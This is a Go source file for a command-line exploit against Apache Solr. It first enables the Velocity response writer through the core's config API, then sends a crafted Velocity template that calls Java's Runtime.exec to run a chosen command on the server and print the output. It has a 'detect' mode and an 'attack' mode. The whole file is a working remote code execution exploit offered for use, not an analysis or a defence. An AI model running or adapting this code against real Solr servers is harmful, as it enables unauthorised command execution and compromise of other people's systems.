package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	ulib "net/url"
	"strings"
)

func main() {
	//定义命令行
	url := flag.String("u", "", "The Core Url,example:http://192.168.191.129:8983/solr/test/")
	action := flag.String("a", "detect", "detect or attack")
	cmd := flag.String("c", "whoami", "command to execute")
	flag.Parse()
	if *url == "" {
		panic("Url is required")
	}
	fmt.Println("Start Attack....")
	if *action == "attack" {
		request_first(*url)
		resp := exploit(*url, *cmd)
		fmt.Println(resp)
	} else {
		request_first(*url)
		resp := exploit(*url, "echo 1945882598607734")
		if strings.Contains(resp, "1945882598607734") {
			fmt.Println("This Site Maybe Vuln")
		} else {
			fmt.Println("This Site Maybe Not Vuln")
		}
	}
}

//发送exploit
func exploit(url string, cmd string) string {
	suffix := `select?wt=velocity&v.template=custom&v.template.custom=`
	payload := ulib.QueryEscape(`#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('` + cmd + `')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end`)
	if !strings.HasSuffix(url, "/") {
		url += "/"
	}
	//fmt.Println(url + suffix + payload)
	resp, err := http.Get(url + suffix + payload)

	if err != nil {
		panic(err.Error())
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	return string(body)

}

//前置请求
func request_first(url string) {
	client := &http.Client{}
	body := `
		{
		  "update-queryresponsewriter": {
		    "startup": "lazy",
		    "name": "velocity",
		    "class": "solr.VelocityResponseWriter",
		    "template.base.dir": "",
		    "solr.resource.loader.enabled": "true",
		    "params.resource.loader.enabled": "true"
		  }
		}
	`
	if !strings.HasSuffix(url, "/") {
		url += "/config"
	} else {
		url += "config"
	}
	req, err := http.NewRequest("POST", url, strings.NewReader(body))
	if err != nil {
		panic(err.Error())
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)

	if err != nil {
		panic(err.Error())
	}

	resp.Body.Close()
}
